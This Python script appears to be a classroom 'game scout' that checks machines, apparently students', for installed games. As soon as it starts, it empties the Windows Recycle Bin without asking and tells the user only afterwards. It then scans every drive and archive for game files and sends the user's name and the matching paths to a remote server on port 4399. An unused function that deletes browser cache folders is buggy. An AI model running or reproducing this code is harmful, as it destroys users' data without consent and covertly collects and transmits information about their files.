import os
import zipfile
from tkinter import *
import rarfile
import socket
import threading
import os, shutil
from ctypes import windll
import os, shutil
from ctypes import windll

li = [
    'D:/software/blink/profile/data/Cache',
    'D:/software/opera/profile/cache'
]


def ergodic(path):
    path = '%s%s' % (path, '/')
    for x in os.listdir(path):
        tmp = os.path.join(path, x)
        if os.path.isdir(tmp):
            shutil.rmtree(tmp)
        else:
            os.remove(tmp)
        for x in li:
            ergodic(x)


windll.shell32.SHEmptyRecycleBinW(0, 0, 1)

x = 0
# 储存游戏字典

games_dict = {
    "QQSpeed_loader.exe": "QQ飞车",
    "GameApp.exe.": "QQ飞车",
    # "Script.pvf": "地下城与勇士",
    "DNF.exe": "地下城与勇士",
    "DNFchina.exe": "地下城与勇士",
    "AdvertTips.exe": "地下城与勇士",
    "lol.launcher_tencent.exe": "英雄联盟",
    "League of legends.exe": "英雄联盟",
    "LolClient.exe": "英雄联盟",
    "TGame.exe ": "逆战OR枪神纪",
    "TCLS": "发现腾讯游戏",
    "Repair.exe": "游戏修复程序",
    "WeGame": "WeGame 腾讯游戏平台",
    "TenSafe.exe": "发现腾讯游戏",
    "D3DX9": "此目录包含游戏",
    "Client.exe": "腾讯游戏通用客户端",
    "wuxia.exe": "天涯明月刀",
    "sdologin.exe": "最终幻想",
    "war3.exe": "魔兽争霸:冰封王座",
    "cstrike": "反恐精英(未知版本)",
    "elementclient.exe": "完美世界游戏",
    "JX3Client.exe": "剑网三",
    "Extopia.exe": "自由禁区",
    "steam.exe": "Steam",
    "Uplay.exe": "育碧游戏平台",
    "WOW.exe": "魔兽世界",
    "crossfire.exe": "穿越火线",
    "QQlogin.exe": "发现腾讯游戏登录器",
    "TslGame.exe": "绝地求生大逃杀",
    "csgo.exe": "反恐精英全球攻势",
    "MonsterHunterWorld.exe": "怪物猎人世界",
    "warframe.exe": "星际战甲",
    "Overwatch.exe": "守望先锋",
    "SlayTheSpire.exe": "杀戮尖塔",
    'HeroesOfTheStorm.exe': "风暴英雄",
    "Steam.exe": "Steam商店",
    "steamapps": "此目录应该会存在很多游戏",
    "left4dead2.exe": "求生之路",
    "NBA2K17.exe": "NBA2K17",
    "NBA2K18.exe": "NBA2K18",
    "wegameservice.exe": "Wegame腾讯游戏平台",
    "UbisoftGameLauncher.exe": "Uplay育碧游戏平台",
    "OriginThinSetupInternal.exe ": "Origin EA游戏平台",
    "UnityPlayer.dll": "Unity引擎游戏",
    "shrinkCopy.dll": "Galgame 视觉小说 恋爱养成",
    "Hearthstone.exe":"哇！金色传说（炉石传说）"

}
# 储存游戏列表
games_list = ['英雄联盟', '地下城与勇士', 'QQ飞车', 'QQ炫舞', '逆战', '剑灵', '天涯明月刀', '最终幻想14', 'NBA2K', '使命召唤', 'FIFAOL', '枪神纪', '流放之路',
              '御龙在天', '冒险岛', '轩辕剑', '战争雷霆', '灵山奇缘', '天堂', '变形金刚', '火源', '虎豹骑', 'H1Z1', '堡垒之夜', '星际战甲', '古剑奇谭', '中国式家长',
              "群侠传", "电竞传奇", '不可思议', '波西亚时光', '围攻', 'Overwatch', "battlenet",
              "Heroes of the Storm",
              "HearthStone", "守望先锋", "风暴英雄", "炉石传说", "StarCraft", "星际争霸", "Destiny2",
              "The Witcher 3: Wild Hunt",
              "Assassin's", "Watch Dogs", "Battlefield", "Call of Duty", "Grand Theft Auto", "CSGO", "逆水寒",
              "杀戮尖塔", "Slay the spire", "网易游戏", "梦幻西游", "大话西游", "Warframe", "Fallout", "The Elder Scrolls", "我的世界",
              "中国式家长", "小霸王", "太吾绘卷", "Nekopara", "Rainbow Six", "Tom clancy's", "MonsterHunter"]

# 储存游戏的列表
games = []


def windows():
    # 创建窗口变量
    window = Tk()
    window.geometry("300x500")
    window.title("游戏侦察者")
    scale = Scale(window, from_=0, to=100, orient=HORIZONTAL)

    scale.pack(fill=X, expand=1)

    show_game = Listbox(window, width=300, height=500)  # 创建列表组件
    window.resizable(width=False, height=False)
    for i in games:
        show_game.insert(0, i)
    show_game.pack()
    window.mainloop()  # 消息循环


def path(pwd):
    # 定义 是文件夹的列表
    is_dir = []
    # 跳转到当前路径
    try:
        os.chdir(pwd)
    except:
        return
    # 打印当前目录
    # 循环 文件夹的文件
    try:
        for i in os.listdir(pwd):
            try:
                if i == "Documents" or i == "AppData" or i == "ProgramData" or  i[-4:] == ".ico" or i == "WindowsApps":

                    continue
                if i == "QWERTYUIOSDFGHJHG":
                    if "未检测到游戏" not in games:
                        games.append("未检测到游戏")
                    return
                try:
                    if ".rar" in i:
                        temp_rar = rarfile.RarFile(i, 'r')
                        rar_list = temp_rar.namelist()
                        for rar_file in rar_list:
                            rar_file = rar_file.encode('cp437').decode('gbk')
                            for game_name, game_id in games_dict.items():
                                if game_name in rar_file:
                                    print(pwd + i + "可能是游戏压缩包")
                                    print(game_id)
                                    if game_id not in games:
                                        games.append(pwd + i)
                                        games.append(game_id)
                                    break
                            for list_temp in games_list:
                                if list_temp in rar_file and len(list_temp) > 1:
                                    print(pwd + i + "可能是游戏压缩包")
                                    print(list_temp)
                                    if list_temp not in games:
                                        games.append(pwd + i)
                                        games.append(list_temp)
                                    break
                except:
                    pass
                try:
                    if ".zip" in i:
                        temp_zip = zipfile.ZipFile(i, 'r')
                        zip_list = temp_zip.namelist()
                        for zip_file in zip_list:
                            zip_file = zip_file.encode('cp437').decode('gbk')
                            for game_name, game_id in games_dict.items():
                                if game_name in zip_file:
                                    print(pwd + i + "可能是游戏压缩包")
                                    print(game_id)
                                    if game_id not in games:
                                        games.append(pwd + i)
                                        games.append(game_id)
                                    break
                            for list_temp in games_list:
                                if list_temp in zip_file and len(list_temp) > 1:
                                    print(pwd + i + "可能是游戏压缩包")
                                    print(list_temp)
                                    if list_temp not in games:
                                        games.append(pwd + i)
                                        games.append(list_temp)
                                    break
                except:
                    pass
                for temp in games_dict.keys():
                    if i == temp:
                        print(pwd + "可能是游戏文件夹")
                        print(games_dict[temp])
                        if i not in games:
                            games.append(pwd)
                            games.append(games_dict[temp])
                for temp in games_list:
                    if temp == i:
                        print(pwd + "可能是游戏文件夹")
                        print(i)
                        if i not in games:
                            games.append(pwd)
                            games.append(i)
                if os.path.isdir(i):
                    # 添加到文件夹列表
                    is_dir.append(i)
            except:
                print(i)
            # 循环文件夹列表

    except:
        pass
    for i in is_dir:
        # 设置递归参数 （路径）
        new_path = pwd + "\\" + i
        # 递归
        global x
        x += 1
        path(new_path)


def traverse():
    # 调用 列出路径所有文件
    path("C:\\")
    path("D:\\")
    path("E:\\")
    path("F:\\")
    path("G:\\")
    path("H:\\")
    return name

while True:
    dest_ip = input("请输入服务器IP")
    if len(dest_ip) >= 9:
        break

name = input("请输入姓名 : ")
print("事先说明 %s 你的回收站已经被清空 " % name)
stu_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
stu_s.connect((dest_ip, 4399))
if len(name) == 2:
    name += "   "
try:

    traverse()
    if len(games) < 1:
        games.append("未检测到游戏")

    stu_s.send(name.encode("utf-8"))

    stu_s.send(str(games).encode("utf-8"))
    windows()
except:
    input("出现错误 按任意键继续")

    stu_s.send(name.encode("utf-8"))

    stu_s.send(str(games).encode("utf-8"))